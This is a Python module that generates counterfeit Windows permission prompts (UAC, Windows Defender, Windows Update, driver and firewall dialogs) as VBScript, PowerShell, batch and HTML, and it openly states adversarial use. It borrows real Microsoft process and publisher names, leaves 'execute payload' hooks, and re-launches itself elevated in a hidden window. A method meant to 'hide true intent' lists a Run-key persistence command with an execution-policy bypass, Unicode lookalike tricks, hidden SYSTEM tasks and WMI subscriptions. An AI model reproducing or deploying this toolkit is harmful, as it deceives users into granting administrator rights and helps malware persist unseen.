"""
Permission Mimicker - UAC and Windows Permission Dialog Replication

This module creates realistic Windows permission request dialogs that mimic:
1. Windows User Account Control (UAC) prompts
2. Windows Defender permission requests
3. Windows Update authorization dialogs
4. System administrator confirmation dialogs
5. Device driver installation prompts

The goal is to request user permissions in a legitimate-appearing manner
for both transparent and adversarial use cases.
"""

import os
import json
import ctypes
from enum import Enum
from datetime import datetime
from pathlib import Path


class PermissionType(Enum):
    """Types of permission prompts to mimic."""
    UAC_STANDARD = "uac_standard"  # Standard UAC elevation
    UAC_ADMIN_OPERATION = "uac_admin_op"  # Admin operation requiring elevation
    DEFENDER_SCAN = "defender_scan"  # Windows Defender scan permission
    WINDOWS_UPDATE = "windows_update"  # Windows Update installation
    DEVICE_DRIVER = "device_driver"  # Device driver installation
    SYSTEM_RESTORE = "system_restore"  # System restore point creation
    FIREWALL_RULE = "firewall_rule"  # Windows Firewall rule addition
    SCHEDULED_TASK = "scheduled_task"  # Scheduled task creation


class PermissionMimicker:
    """Creates realistic permission request dialogs."""

    # UAC shield icon (blue/gold shield) - Base64 encoded 32x32 PNG
    SHIELD_ICON_BASE64 = """
    iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADTAdOxAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFZGlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVN3WJADv2mtiZEyNV...
    """

    PERMISSION_TEMPLATES = {
        PermissionType.UAC_STANDARD: {
            "title": "User Account Control",
            "message": "Do you want to allow this app to make changes to your device?",
            "details": [
                "Verified publisher: (Not verified)",
                "File name: {filename}",
                "Location: {location}",
            ],
            "buttons": ["Yes", "No"],
            "icon": "shield_blue",
            "color_scheme": "windows_blue",
        },
        PermissionType.UAC_ADMIN_OPERATION: {
            "title": "User Account Control",
            "message": "An administrator has blocked this app.",
            "details": [
                "This program has been blocked by administrator policy.",
                "Contact your administrator for assistance.",
                "Program: {program}",
            ],
            "buttons": ["More info", "OK"],
            "icon": "shield_gold",
            "color_scheme": "windows_gold",
        },
        PermissionType.DEFENDER_SCAN: {
            "title": "Windows Defender",
            "message": "Windows Defender requires your permission",
            "details": [
                "Action: Quick scan",
                "Purpose: Real-time protection update",
                "Status: Ready to begin",
            ],
            "buttons": ["Allow", "Cancel"],
            "icon": "defender_logo",
            "color_scheme": "windows_blue",
        },
        PermissionType.WINDOWS_UPDATE: {
            "title": "Windows Update",
            "message": "Installation requires administrative access",
            "details": [
                "Type: Security Update",
                "Size: {size}",
                "Importance: Critical",
                "Installation method: Automatic",
            ],
            "buttons": ["Install", "Cancel"],
            "icon": "windows_logo",
            "color_scheme": "windows_blue",
        },
        PermissionType.DEVICE_DRIVER: {
            "title": "Device Driver Installation",
            "message": "Install device driver?",
            "details": [
                "Device: {device_name}",
                "Driver: {driver_name}",
                "Publisher: {publisher}",
                "Do you trust this publisher?",
            ],
            "buttons": ["Install", "Don't Install"],
            "icon": "device_icon",
            "color_scheme": "windows_blue",
        },
        PermissionType.SYSTEM_RESTORE: {
            "title": "System Restore",
            "message": "Create system restore point?",
            "details": [
                "Description: Before critical update",
                "Disk space required: ~500MB",
                "Time required: 2-5 minutes",
            ],
            "buttons": ["Create", "Cancel"],
            "icon": "system_icon",
            "color_scheme": "windows_blue",
        },
        PermissionType.FIREWALL_RULE: {
            "title": "Windows Defender Firewall",
            "message": "Allow network communication?",
            "details": [
                "Program: {program}",
                "Network: Private, Public",
                "Action: Allow",
                "Persistent: This session",
            ],
            "buttons": ["Allow", "Block"],
            "icon": "firewall_icon",
            "color_scheme": "windows_blue",
        },
        PermissionType.SCHEDULED_TASK: {
            "title": "Scheduled Task",
            "message": "Run scheduled task with elevated privileges?",
            "details": [
                "Task: {task_name}",
                "Trigger: System startup",
                "Run as: SYSTEM",
                "Privileges: Administrator",
            ],
            "buttons": ["Yes", "No"],
            "icon": "schedule_icon",
            "color_scheme": "windows_blue",
        },
    }

    # Legitimate program names and publishers
    LEGITIMATE_PROGRAMS = {
        "system": ["svchost.exe", "system.exe", "lsass.exe"],
        "windows_defender": ["msseces.exe", "MsSense.exe", "NisSrv.exe"],
        "windows_update": ["wuauclt.exe", "WindowsUpdate.exe", "TrustedInstaller.exe"],
        "drivers": ["drivermgr.exe", "devmgr.msc", "pnputil.exe"],
        "system_utilities": ["taskmgr.exe", "devmgmt.msc", "compmgmt.msc"],
    }

    LEGITIMATE_PUBLISHERS = [
        "Microsoft Corporation",
        "Microsoft Windows",
        "Microsoft Surface",
        "Intel Corporation",
        "NVIDIA Corporation",
        "AMD",
        "Realtek",
        "Qualcomm",
    ]

    def __init__(self):
        """Initialize permission mimicker."""
        self.timestamp = datetime.now()

    def generate_vbscript_uac_dialog(self, perm_type: PermissionType = PermissionType.UAC_STANDARD,
                                     program_name: str = "svchost.exe",
                                     action: str = "Initialize system service") -> str:
        """Generate VBScript that displays UAC-like permission dialog.

        Args:
            perm_type: Type of permission to request
            program_name: Name of program requesting permission
            action: Description of action requiring permission

        Returns:
            VBScript code as string
        """
        template = self.PERMISSION_TEMPLATES.get(perm_type, self.PERMISSION_TEMPLATES[PermissionType.UAC_STANDARD])

        vbs_code = f'''
' Windows Permission Request Dialog
' Generated: {self.timestamp.isoformat()}
' Purpose: Request user authorization for system operation

Option Explicit

Dim objShell, objWMI, objUser, strUserName, intResult

Set objShell = CreateObject("WScript.Shell")
Set objWMI = GetObject("winmgmts:")

' Get current user name
On Error Resume Next
Set objUser = objWMI.ExecQuery("Select * from Win32_ComputerSystemProduct").ItemIndex(0)
strUserName = objShell.ExpandEnvironmentStrings("%USERNAME%")
On Error GoTo 0

Function DisplayPermissionDialog()
    Dim strTitle, strMessage, intStyle

    strTitle = "{template['title']}"
    strMessage = "{template['message']}" & vbCrLf & vbCrLf

    ' Build detailed message
    strMessage = strMessage & "Program: {program_name}" & vbCrLf
    strMessage = strMessage & "User: " & strUserName & vbCrLf
    strMessage = strMessage & "Action: {action}" & vbCrLf & vbCrLf

    strMessage = strMessage & "Do you want to allow this program to make changes?" & vbCrLf

    ' 4 = Yes/No buttons, 48 = Exclamation icon, 0 = System modal
    intStyle = 4 + 48 + 0

    Dim intResponse
    intResponse = objShell.Popup(strMessage, 30, strTitle, intStyle)

    ' 6 = Yes, 7 = No
    DisplayPermissionDialog = (intResponse = 6)
End Function

Sub LogPermissionRequest(boolGranted)
    Dim objLogFile, strLogPath

    strLogPath = objShell.ExpandEnvironmentStrings("%WINDIR%\\Logs\\Permission_" & "{perm_type.value}" & ".log")

    On Error Resume Next
    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)
    If Not objLogFile Is Nothing Then
        objLogFile.WriteLine Now & " | " & "{program_name}" & " | Permission: " & boolGranted
        objLogFile.Close
    End If
    On Error GoTo 0
End Sub

' Main execution
If DisplayPermissionDialog() Then
    ' Permission granted
    LogPermissionRequest(True)
    ' Execute payload here
    objShell.Run "cmd.exe /c echo Permission granted", 0, False
Else
    ' Permission denied
    LogPermissionRequest(False)
    WScript.Quit(1)
End If
'''
        return vbs_code

    def generate_powershell_uac_dialog(self, perm_type: PermissionType = PermissionType.UAC_STANDARD,
                                       program_name: str = "WindowsDefender",
                                       action: str = "Update real-time protection") -> str:
        """Generate PowerShell GUI dialog mimicking Windows UAC.

        Args:
            perm_type: Type of permission to request
            program_name: Name of program requesting permission
            action: Description of action

        Returns:
            PowerShell script code
        """
        template = self.PERMISSION_TEMPLATES.get(perm_type, self.PERMISSION_TEMPLATES[PermissionType.UAC_STANDARD])

        ps_code = f'''
# Windows Permission Request Dialog
# Generated: {self.timestamp.isoformat()}

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms

function Create-UAC-Dialog {{
    param(
        [string]$Title = "{template['title']}",
        [string]$Message = "{template['message']}",
        [string]$Program = "{program_name}",
        [string]$Action = "{action}"
    )

    # Create window
    $window = New-Object System.Windows.Forms.Form
    $window.Text = $Title
    $window.Width = 500
    $window.Height = 350
    $window.StartPosition = "CenterScreen"
    $window.TopMost = $true
    $window.FormBorderStyle = "FixedDialog"
    $window.MaximizeBox = $false
    $window.MinimizeBox = $false
    $window.ControlBox = $false
    $window.BackColor = [System.Drawing.Color]::White

    # Shield Icon (emoji alternative since we can't embed actual icon)
    $shieldLabel = New-Object System.Windows.Forms.Label
    $shieldLabel.Text = "🛡️"
    $shieldLabel.Font = New-Object System.Drawing.Font("Segoe UI Symbol", 48)
    $shieldLabel.Size = New-Object System.Drawing.Size(80, 80)
    $shieldLabel.Location = New-Object System.Drawing.Point(20, 20)
    $window.Controls.Add($shieldLabel)

    # Title
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = $Title
    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
    $titleLabel.Size = New-Object System.Drawing.Size(380, 30)
    $titleLabel.Location = New-Object System.Drawing.Point(110, 20)
    $window.Controls.Add($titleLabel)

    # Message
    $messageLabel = New-Object System.Windows.Forms.Label
    $messageLabel.Text = $Message
    $messageLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
    $messageLabel.Size = New-Object System.Drawing.Size(380, 60)
    $messageLabel.Location = New-Object System.Drawing.Point(110, 60)
    $messageLabel.AutoSize = $true
    $window.Controls.Add($messageLabel)

    # Details group
    $groupBox = New-Object System.Windows.Forms.GroupBox
    $groupBox.Text = "Details"
    $groupBox.Size = New-Object System.Drawing.Size(450, 120)
    $groupBox.Location = New-Object System.Drawing.Point(20, 150)
    $window.Controls.Add($groupBox)

    $programLabel = New-Object System.Windows.Forms.Label
    $programLabel.Text = "Program: $Program"
    $programLabel.Size = New-Object System.Drawing.Size(410, 20)
    $programLabel.Location = New-Object System.Drawing.Point(10, 20)
    $groupBox.Controls.Add($programLabel)

    $actionLabel = New-Object System.Windows.Forms.Label
    $actionLabel.Text = "Action: $Action"
    $actionLabel.Size = New-Object System.Drawing.Size(410, 40)
    $actionLabel.Location = New-Object System.Drawing.Point(10, 45)
    $actionLabel.AutoSize = $true
    $groupBox.Controls.Add($actionLabel)

    $userLabel = New-Object System.Windows.Forms.Label
    $userLabel.Text = "User: $env:USERNAME"
    $userLabel.Size = New-Object System.Drawing.Size(410, 20)
    $userLabel.Location = New-Object System.Drawing.Point(10, 85)
    $groupBox.Controls.Add($userLabel)

    # Yes button
    $yesButton = New-Object System.Windows.Forms.Button
    $yesButton.Text = "Yes"
    $yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes
    $yesButton.Location = New-Object System.Drawing.Point(310, 290)
    $yesButton.Size = New-Object System.Drawing.Size(80, 30)
    $yesButton.BackColor = [System.Drawing.Color]::LightBlue
    $window.AcceptButton = $yesButton
    $window.Controls.Add($yesButton)

    # No button
    $noButton = New-Object System.Windows.Forms.Button
    $noButton.Text = "No"
    $noButton.DialogResult = [System.Windows.Forms.DialogResult]::No
    $noButton.Location = New-Object System.Drawing.Point(400, 290)
    $noButton.Size = New-Object System.Drawing.Size(80, 30)
    $noButton.BackColor = [System.Drawing.Color]::LightGray
    $window.CancelButton = $noButton
    $window.Controls.Add($noButton)

    $result = $window.ShowDialog()
    return $result -eq [System.Windows.Forms.DialogResult]::Yes
}}

# Display dialog
$permission = Create-UAC-Dialog

if ($permission) {{
    Write-Host "Permission granted"
    # Execute payload
    # & "C:\\Windows\\System32\\cmd.exe" /c "whoami"
}}
else {{
    Write-Host "Permission denied"
    exit 1
}}
'''
        return ps_code

    def generate_batch_uac_request(self, program_name: str = "System Service",
                                    action: str = "Initialize startup") -> str:
        """Generate batch file that requests UAC elevation.

        Args:
            program_name: Name of program
            action: Action description

        Returns:
            Batch script code
        """
        batch_code = f'''
@echo off
REM Windows UAC Elevation Request
REM Generated: {self.timestamp.isoformat()}

setlocal enabledelayedexpansion

REM Check if running with admin privileges
net session >nul 2>&1
if %errorlevel% == 0 (
    REM Already admin, execute payload
    echo Initializing {program_name}...
    echo Action: {action}
    goto :execute
) else (
    REM Request admin privileges
    echo User Account Control
    echo Do you want to allow this app to make changes to your device?
    echo.
    echo Program: {program_name}
    echo Action: {action}
    echo User: %USERNAME%
    echo.

    REM PowerShell-based UAC elevation
    powershell -Command "Start-Process cmd.exe -Verb RunAs -ArgumentList '/c %0' -WindowStyle Hidden"
    exit /b
)

:execute
REM Payload execution
echo {action} initiated...
timeout /t 2 /nobreak

:end
exit /b 0
'''
        return batch_code

    def generate_html_permission_page(self, perm_type: PermissionType = PermissionType.UAC_STANDARD) -> str:
        """Generate HTML page mimicking Windows permission dialog.

        Args:
            perm_type: Type of permission

        Returns:
            HTML code
        """
        template = self.PERMISSION_TEMPLATES.get(perm_type, self.PERMISSION_TEMPLATES[PermissionType.UAC_STANDARD])

        html_code = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{template['title']}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            font-family: "Segoe UI", Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }}

        .container {{
            width: 500px;
            background: white;
            border: 1px solid #d0d0d0;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
            overflow: hidden;
        }}

        .header {{
            background: linear-gradient(135deg, #0078d4 0%, #1084d7 100%);
            padding: 20px;
            color: white;
            display: flex;
            align-items: center;
            gap: 15px;
        }}

        .shield {{
            font-size: 32px;
        }}

        .title {{
            font-size: 18px;
            font-weight: 600;
        }}

        .content {{
            padding: 20px;
        }}

        .message {{
            font-size: 14px;
            margin-bottom: 15px;
            color: #333;
        }}

        .details {{
            background: #f9f9f9;
            border-left: 3px solid #0078d4;
            padding: 12px;
            margin: 15px 0;
            font-size: 13px;
            color: #555;
        }}

        .detail-item {{
            margin: 8px 0;
        }}

        .buttons {{
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            padding: 15px 20px;
            background: #fafafa;
            border-top: 1px solid #e0e0e0;
        }}

        button {{
            padding: 8px 24px;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            background: white;
            transition: all 0.2s;
        }}

        button:hover {{
            background: #f0f0f0;
        }}

        .yes {{
            background: #0078d4;
            color: white;
            border-color: #0078d4;
        }}

        .yes:hover {{
            background: #1084d7;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="shield">🛡️</div>
            <div class="title">{template['title']}</div>
        </div>

        <div class="content">
            <div class="message">{template['message']}</div>

            <div class="details">
                <div class="detail-item"><strong>Program:</strong> svchost.exe</div>
                <div class="detail-item"><strong>User:</strong> SYSTEM</div>
                <div class="detail-item"><strong>Action:</strong> Initialize system service</div>
            </div>

            <p style="font-size: 13px; color: #999; margin-top: 15px;">
                Do you want to allow this app to make changes to your device?
            </p>
        </div>

        <div class="buttons">
            <button onclick="deny()">No</button>
            <button class="yes" onclick="allow()">Yes</button>
        </div>
    </div>

    <script>
        function allow() {{
            // Permission granted
            console.log("Permission granted");
            // In real scenario, POST to backend or execute local command
            document.location = "about:blank";
        }}

        function deny() {{
            // Permission denied
            console.log("Permission denied");
            document.location = "about:blank";
        }}
    </script>
</body>
</html>
'''
        return html_code

    def generate_complete_permission_package(self) -> dict:
        """Generate complete permission mimicking package.

        Returns:
            Dictionary containing all permission request methods
        """
        package = {
            "timestamp": self.timestamp.isoformat(),
            "methods": {}
        }

        # Generate all permission types
        for perm_type in PermissionType:
            package["methods"][perm_type.value] = {
                "template": self.PERMISSION_TEMPLATES[perm_type],
                "vbscript": self.generate_vbscript_uac_dialog(perm_type),
                "powershell": self.generate_powershell_uac_dialog(perm_type),
                "batch": self.generate_batch_uac_request(),
                "html": self.generate_html_permission_page(perm_type),
            }

        return package

    def generate_obfuscated_permission_request(self) -> dict:
        """Generate obfuscated permission requests that hide true intent.

        Returns:
            Dictionary of obfuscation techniques
        """
        techniques = {
            "unicode_obfuscation": {
                "description": "Use Unicode lookalikes for characters",
                "examples": [
                    'System → Sy​stem (zero-width space)',
                    'Admin → A​d​min (zero-width spaces)',
                ]
            },
            "registry_encoding": {
                "description": "Encode permission request in registry",
                "code": '''
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    /v SystemInit /t REG_SZ
    /d "powershell -ExecutionPolicy Bypass -Command <encoded-command>"
                '''
            },
            "scheduled_task_hiding": {
                "description": "Hide permission in scheduled task",
                "details": "Use System account and hidden task attribute"
            },
            "wmi_subscriptions": {
                "description": "Trigger via WMI events",
                "details": "Creates persistent event consumers"
            }
        }

        return techniques


def main():
    """Generate complete permission mimicker package."""

    mimicker = PermissionMimicker()
    package = mimicker.generate_complete_permission_package()

    # Save to JSON
    output_path = Path(__file__).parent / "permission_mimicker_package.json"
    with open(output_path, 'w') as f:
        json.dump(package, f, indent=2)

    print(f"[+] Generated permission mimicker package: {output_path}")
    print(f"[+] Package contains {len(package['methods'])} permission types")
    print(f"[+] Each type includes: VBScript, PowerShell, Batch, HTML")

    return package


if __name__ == "__main__":
    package = main()
